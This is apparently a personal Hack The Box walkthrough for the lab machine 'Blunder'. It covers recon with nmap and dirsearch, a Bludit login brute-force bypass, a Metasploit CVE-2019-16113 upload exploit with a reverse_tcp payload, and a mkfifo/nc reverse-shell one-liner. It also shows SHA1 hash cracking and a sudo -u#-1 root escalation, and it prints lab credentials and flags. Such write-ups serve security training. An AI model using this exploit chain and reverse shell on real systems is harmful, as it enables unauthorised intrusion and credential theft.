IP: 10.10.10.191

1. nmap

nmap -sV -sC -Pn -T4 -v -p- --min-rate=10000 10.10.10.191

Output: nmap-output.txt

2. gobuster

gobuster dir -u 10.10.10.191 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

No output - Error.

3. Search /admin

http://10.10.10.191/admin/ = Login Page
In Page source:
<input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="4c6df3daf04ef4593f0d0a932f2b8a8d8c1736cb">

4. dirsearch

sudo dirsearch -u 10.10.10.191 -e *

-u = URL
-e = Extension (.txt, .php etc.)

Output: dirsearch-output.txt

5. wfuzz

wfuzz -u http://10.10.10.191/FUZZ.txt -w /usr/share/seclists/Discovery/Web-Content/big.txt --sc 200

Output: wfuzz-output.txt

6. Navigate to TODO File:

Output:

-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING

We have found a name - fergus.

7. I got stuck here and decided to search around + ask on forums, was told to use cewl + Bludit Brute Force Mitigation Bypass:
https://tools.kali.org/password-attacks/cewl
https://rastating.github.io/bludit-brute-force-mitigation-bypass/

(a) Generate wordlist

cewl -w wordlist.txt -d 10 -m 1 http://10.10.10.191/

http://stuffjasondoes.com/2018/07/18/creating-custom-wordlists-for-targeted-attacks-with-cewl/

-d = Depth to spider to --> e.g. if d=0 (0 links deep), meaning we only want to gather words from this specific page. Since its 10, we want to gather words that are 10 links deep.
-m = Minimum word length.
-w = Text file name, where wordlist is to be captured.

(b) Download + Edit the Bludit Brute Force Mitigation Bypass.

nano bludit-bf.py

Change to:
host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = '/home/kali/labs/hackthebox/Blunder/files/wordlist.txt'

Remove part that mentions #generate 50 incorrect passwords.

- https://fdlucifer.github.io/2020-06-05-blunder.html has a better one to use!

(c) Run the bludit-bf.py

python bludit-bf.py

Output:
...
()
SUCCESS: Password found!
Use fergus:RolandDeschain to login.
()

8. Sign in to Bludit
Go to Edit User, found an Authentication token
0e8011811356c0c5bd2211cba8c50471

Right Click, View Source Code.
Line 46, 47:
var BLUDIT_VERSION = "3.9.2";
var BLUDIT_BUILD = "20190530";

9. Search for CVE + Metasploit for Vulnerability + Exploit

CVE-2019-16113 	Bludit 3.9.2 allows remote code execution via bl-kernel/ajax/upload-images.php because PHP code can be entered with a .jpg file name, and then this PHP code can write other PHP code to a ../ pathname.

in mfsmodule:

`search 2019-16113`
`use bludit_upload_images_exec`
`show payloads`
- This will show all compatible payloads.
`set payload php/meterpreter/reverse_tcp`
`set rhosts 10.10.10.191`
`set rport 80`
`set lhost 10.10.14.24`
`set lport 4444`
`set targeturi /`
`set bluditpass RolandDeschain`
`set bludituser fergus`
`run`

In Meterpreter:
`shell`

In a new local terminal A:
`nc -lvnp 5555`

In Metasploit Shell B:
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`

In A:
```
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In (same terminal window) Kali
$ stty -a
# Make a note of Rows + Columns, (rows 24; columns 114;)
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows 24 columns 114
```
10. Look around

cd ..
cd databases
cat users.php
Output: usersphp-output.txt

Found admin info here = /var/www/bludit-3.9.2/bl-content/databases:

"role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00"

In /var/www/bludit-3.10.0a/bl-content/databases there is also a users.php file.
Output: usersphp-bludit310-output.txt

Found Hugo Password:

"password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",

Anaylsed using hash-identifier:

hash-identifier faca404fd5c0a31cf1897b823c695c85cffeb98d
Output: hashid.txt
Possibly SHA1, so let's try to decrypt.
Tried hashcat but took ages, used https://md5decrypt.net/en/Sha1/
Password for Hugo = Password120

su hugo
Password: Password120

Logged in as Hugo!

Navigate to /home/hugo.
User.txt:
b0bb7b5f48e7cf773cd5d6f9c0451e77

---
Privilege Escalation

sudo -l
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash

Searching for that last line:

https://www.exploit-db.com/exploits/47502
Shows us that we can use:

sudo -u#-1 /bin/bash

To get a root shell.

Reasoning: root-using-bangroot.txt

cat /root/root.txt
67001b18c903fa43580661c994ee1bb7
